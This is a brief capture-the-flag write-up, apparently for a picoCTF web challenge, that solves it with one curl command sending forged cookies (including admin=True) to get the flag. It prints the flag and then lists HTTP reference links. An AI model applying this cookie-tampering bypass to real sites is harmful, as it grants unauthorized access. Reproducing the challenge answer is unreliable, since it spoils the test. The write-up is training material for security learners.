## Descripción
The factory is hiding things from all of its users.

Can you login as Joe and find what they've been looking at? [http://fickle-tempest.picoctf.net:63103](http://fickle-tempest.picoctf.net:63103)

## Solución
aron-tank_3@aaron-tankVirtualBox:~$ curl -s http://fickle-tempest.picoctf.net:63103/flag -H "Cookie: password=carlos; username=carlos; admin=True" | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}</code></p>
aaron-tank_3@aaron-tankVirtualBox:~$ 

picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}
## Notas Adicionales
- http: [https://developer.mozilla.org/en-US/docs/Web/HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP "https://developer.mozilla.org/en-US/docs/Web/HTTP")
- http headers: [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers")
- request headers: [https://developer.mozilla.org/en-US/docs/Glossary/Request_header](https://developer.mozilla.org/en-US/docs/Glossary/Request_header "https://developer.mozilla.org/en-US/docs/Glossary/Request_header")
- request methods: [https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods "https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods")
- response headers: [https://developer.mozilla.org/en-US/docs/Glossary/Response_header](https://developer.mozilla.org/en-US/docs/Glossary/Response_header "https://developer.mozilla.org/en-US/docs/Glossary/Response_header")
- response codes: [https://developer.mozilla.org/en-US/docs/Web/HTTP/Status](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status "https://developer.mozilla.org/en-US/docs/Web/HTTP/Status")
- cookies: [https://en.wikipedia.org/wiki/HTTP_cookie](https://en.wikipedia.org/wiki/HTTP_cookie "https://en.wikipedia.org/wiki/HTTP_cookie")

## Referencias